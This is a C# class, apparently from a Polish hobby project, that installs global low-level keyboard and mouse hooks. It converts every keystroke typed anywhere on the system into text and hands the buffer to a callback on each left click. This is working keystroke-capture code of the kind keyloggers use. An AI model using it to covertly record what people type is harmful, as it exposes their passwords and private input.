using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace gra
{
    class klikanie
    {
        myProcDelegate delegatePtr;
        delegate int myProcDelegate(int what, int paramH, int paramL);
        IntPtr willCancel;
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int type, myProcDelegate ptrProcedure, IntPtr zeroPtr, uint zero);

        myProcDelegate mouseDelPtr;
        IntPtr msWlCancel;
        public klikanie()
        {
            delegatePtr = new myProcDelegate(myProc);
            willCancel = SetWindowsHookEx(13, delegatePtr, IntPtr.Zero, 0);//13=klawiatura
            mouseDelPtr = new myProcDelegate(msProc);
            msWlCancel = SetWindowsHookEx(14, mouseDelPtr, IntPtr.Zero, 0);//14=szczur
        }
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hookHandle);
        ~klikanie()
        {
            UnhookWindowsHookEx(willCancel);
            UnhookWindowsHookEx(msWlCancel);
        }
        public struct lowerParam
        {
            public int myCode;
            public int scCode;
            public int flag;
            public int time;
            public int extra;
        }
        public delegate void willDoThis(Keys klawisz);
        public delegate void willOrThis(string co);
        public willDoThis doThis = null;
        public willOrThis orThis = null;
        [DllImport("user32.dll")]
        static extern int CallNextHookEx(IntPtr ignored, int givenCode, int givenHigherParam, int givenLowerParam);
        bool click = true;
        string co = "";
        [DllImport("USER32.dll")]
        static extern short GetKeyState(int nVirtKey);
        public int myProc(int what, int wParam, int lParam)
        {
            click = false;
            int code;
            unsafe {
                lowerParam* ptr = (lowerParam*)lParam;
                code = ptr->myCode;
            }
            const int down = 0x0100;
            const int sysDown = 0x0104;
            if (doThis != null && what >= 0 && (wParam == down || wParam == sysDown)) doThis((Keys)code);
            if (orThis != null && what >= 0 && (wParam == down || wParam == sysDown))
            {
                const int KEY_PRESSED = 0x8000;
                bool isUpper = false;
                if (Convert.ToBoolean(GetKeyState(0x14) & KEY_PRESSED)) isUpper = true;//caps
                if (Convert.ToBoolean(GetKeyState(0xA0) & KEY_PRESSED)|| Convert.ToBoolean(GetKeyState(0xA1) & KEY_PRESSED)) isUpper = !isUpper;//shift
                if (isUpper&&((code >= 48 && code <= 57)|| (code >= 65 && code <= 90)))
                {
                    co += "(?" + code.ToString() + ")";
                }
                else if (code >= 48 && code <= 57)//0-9
                {
                    co += (char)code;
                } else if (code >= 65 && code <= 90) //a-z
                {
                    co += (char)(code + 32);
                }else if (code >= 96 && code <= 105) //numerical 0-9
                {
                    co += (char)(code - 48);
                }else if (code >= 112 && code <= 123) //F1-F12
                {
                    co += "(F"+(code - 111).ToString()+")";
                }
                else
                {
                    switch (code)
                    {
                        case 165:
                            co += "(RALT)";
                            break;
                        case 92:
                            co += "(RWIN)";
                            break;
                        case 93:
                            co += "(CNTXT)";
                            break;
                        case 163:
                            co += "(RCTRL)";
                            break;
                        case 161:
                            co += "(RSHFT)";
                            break;
                        case 3:
                            co += "(CANCEL)";
                            break;
                        case 12:
                            co += "(LCNTR)";
                            break;
                        case 144:
                            co += "(NMLCK)";
                            break;
                        case 32:
                            co += "(SPACE)";
                            break;
                        case 20:
                            co += "(CAPS)";
                            break;
                        case 160:
                            co += "(LSHFT)";
                            break;
                        case 162:
                            co += "(LCTRL)";
                            break;
                        case 91:
                            co += "(LWIN)";
                            break;
                        case 164:
                            co += "(LALT)";
                            break;
                        case 38:
                            co += "(UP)";
                            break;
                        case 37:
                            co += "(LEFT)";
                            break;
                        case 40:
                            co += "(DOWN)";
                            break;
                        case 39:
                            co += "(RIGHT)";
                            break;
                        case 44:
                            co += "(PRINT)";
                            break;
                        case 145:
                            co += "(SCROLL)";
                            break;
                        case 19:
                            co += "(PAUSE)";
                            break;
                        case 36:
                            co += "(HOME)";
                            break;
                        case 35:
                            co += "(END)";
                            break;
                        case 45:
                            co += "(INSERT)";
                            break;
                        case 33:
                            co += "(PGUP)";
                            break;
                        case 46:
                            co += "(DEL)";
                            break;
                        case 34:
                            co += "(PGDN)";
                            break;
                        case 27:
                            co += "(ESC)";
                            break;
                        case 8:
                            co += "(BACK)";
                            break;
                        case 9:
                            co += "(TAB)";
                            break;
                        case 13:
                            co += "(ENTER)";
                            break;
                        case 110:
                            co += ",";
                            break;
                        case 192:
                            co += "`";
                            break;
                        case 189:
                            co += "-";
                            break;
                        case 187:
                            co += "=";
                            break;
                        case 219:
                            co += "[";
                            break;
                        case 221:
                            co += "]";
                            break;
                        case 186:
                            co += ";";
                            break;
                        case 222:
                            co += "'";
                            break;
                        case 220:
                            co += "\\";
                            break;
                        case 188:
                            co += ",";
                            break;
                        case 190:
                            co += ".";
                            break;
                        case 191:
                            co += "/";
                            break;
                        case 226:
                            co += "\\";
                            break;
                        case 111:
                            co += "/";
                            break;
                        case 106:
                            co += "*";
                            break;
                        case 109:
                            co += "-";
                            break;
                        case 107:
                            co += "+";
                            break;
                        default:
                            co += "(?" + code.ToString() + ")";
                            break;
                    }
                }
            }
            return CallNextHookEx(willCancel, what, wParam, lParam);
        }
        public int msProc(int what, int paramH, int paramL)
        {
            const int WM_LBUTTONDOWN = 0x0201;
            if (what >= 0 && paramH== WM_LBUTTONDOWN && click==false)
            {
                click = true;
                if(doThis != null)doThis(Keys.LButton);
                if (orThis != null)
                {
                    orThis(co);
                    co = "";
                }
            }
            return CallNextHookEx(willCancel, what, paramH, paramL);
        }
    }
}
